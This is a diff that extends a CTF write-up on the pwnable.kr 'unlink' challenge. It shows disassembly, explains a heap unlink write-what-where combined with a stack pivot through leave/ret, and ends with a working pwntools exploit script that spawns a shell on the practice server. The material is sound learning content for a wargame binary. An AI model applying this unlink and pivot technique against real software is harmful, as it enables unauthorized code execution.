@@ -107,3 +107,130 @@ Remarkably there is no check for corruption in linked list like the one in mallo
 
 My first thought while preparing any exploit was:
 > Ok, just make ```B->bk``` point to ret addy on the stack and overwrite it with address of ```shell()```, which gets written into ```B->fd```.
+
+I was absolutely wrong. ```B-fd``` and ```B-bk``` have to point to a writeable address, but I have never seen writable .text section before...
+That's why we have to find any writable location in process' memory map. But wait...Isn't the binary providing already a stack address to us?
+
+ Changing tactics now:
+ Letting ```B->bk``` point to a stack address and ```B->fd``` to an address in first chunk we control, we could gain any progress in our aim in binary demolition...
+
+ Check the following code:
+ ```
+;-- unlink
+0x08048504      push ebp
+0x08048505      mov ebp, esp
+0x08048507      sub esp, 0x10                         
+0x0804850a      mov eax, dword [arg_8h]   
+0x0804850d      mov eax, dword [eax + 4]  
+0x08048510      mov dword [local_4h], eax 
+0x08048513      mov eax, dword [arg_8h]   
+0x08048516      mov eax, dword [eax]
+0x08048518      mov dword [local_8h], eax
+0x0804851b      mov eax, dword [local_8h] 
+0x0804851e      mov edx, dword [local_4h]  
+0x08048521      mov dword [eax + 4], edx
+0x08048524      mov eax, dword [local_4h]  
+0x08048527      mov edx, dword [local_8h]          
+0x0804852a      mov dword [eax], edx                
+0x0804852c      nop       
+0x0804852d      leave                               
+0x0804852e      ret                
+ ```
+
+ unlink uses a normal epilogue with  ```leave``` and ```ret``` instructions. We could use ```leave``` to pop into ebp our controlled address. Control of ebp leads to control of esp as well. Afterwards ```ret``` would do rest for us with redirecting control flow.
+
+ After unlinking the following instructions will be executed:
+
+ ```
+;-- main
+0x080485f2		call sym.unlink
+0x080485f7      add esp, 0x10                          
+0x080485fa      mov eax, 0                             
+0x080485ff      mov ecx, dword [ebp-4]
+0x08048602      leave                                                          
+0x08048603      lea esp, [ecx - 4]                                          
+0x08048606      ret               
+ ```
+
+ Content of ebp-4 gets copied to ecx. So at the end program will be redirected to wherever ecx-4 points to. If we let ebp point to a location on heap, control flow will be redirected to whatever is written 4 bytes before that location. We have a "write-what-where"-gadget, so why not letting it point to ```shell()```?
+
+ The address that will be leaked out on stdout is at location ebp-0x14 which can be verified using a debugger:
+
+ ```
+ [...]
+here is stack address leak: 0xffffd1e4
+here is heap address leak: 0x804b410
+
+pwndbg> distance 0xffffd1e4 ebp-4
+0xffffd1e4->0xffffd1f4 is 0x10 bytes (0x4 words)
+ ```
+
+That means, that leak gives us information about the location of ebp-0x14 => leaked addy + 0x10 will point to ebp-0x4 (our target address).
+
+## Crafting payload
+Now after evaluating out tactics, payload actually will lokk like this:
+```
+payload  = 	p32(shell) 	+ \
+			"A"*12		+ \
+			p32(&A+12) 	+ \ 			<----- To discuss
+			p32(leaked_stack_addy+0x10)
+```
+
+There's only one last remaining point to care about. In main+212 ```lea    esp,[ecx-0x4]``` the address of whats written to ebp-4 will be reduced by 4 bytes. As buffer offset in chunk is at position 8 we have to assign ```A->buf+4``` to ```B->fd```
+
+## Actual exploit
+
+Check the following [script](https://github.com/bu6hunt3r/CTF/blob/master/pwnable_kr/Unlink/unlink_sploit.py) in my github repo
+
+```python
+from __future__ import print_function
+from pwn import *
+import argparse
+
+
+def leak():
+    context(os="linux", arch="i386", log_level="INFO", bits=32)
+    print(args)
+    e=ELF("./unlink")
+    shell=e.symbols["shell"]
+    if args.local:
+        p=process("./unlink")
+
+    elif args.remote:
+        print(">>> Connecting to pwnable.kr")
+        c=ssh(user="unlink", host="pwnable.kr", port=2222, password="guest")
+        p=c.process("./unlink")
+
+    response=p.recvuntil("shell!\n")
+    stack=int(response.split("\x0a")[0][-10:],16)
+    heap=int(response.split("\x0a")[1][-10:],16)
+    log.info("stack @ 0x{:08x}".format(stack))
+    log.info("heap @ 0x{:08x}".format(heap))
+
+    return (p, stack,heap, shell)
+
+
+def overwrite():
+    (p, stack, heap, shell) = leak()
+    payload=    p32(shell) + \
+                "A"*12 + \
+                p32(heap+0xc) + \
+                p32(stack+0x10)
+    p.sendline(payload)
+    p.interactive()
+
+def main():
+    global args
+    parser=argparse.ArgumentParser()    
+    parser.add_argument("-r", "--remote", action="store_true", help="Spawn shell on pwnable.kr server")
+    parser.add_argument("-l", "--local", action="store_true", help="Run it locally")
+    parser.set_defaults(local=False, remote=False)
+    args=parser.parse_args()
+
+    overwrite()
+
+if __name__ == '__main__':
+    main()
+
+ ```
+
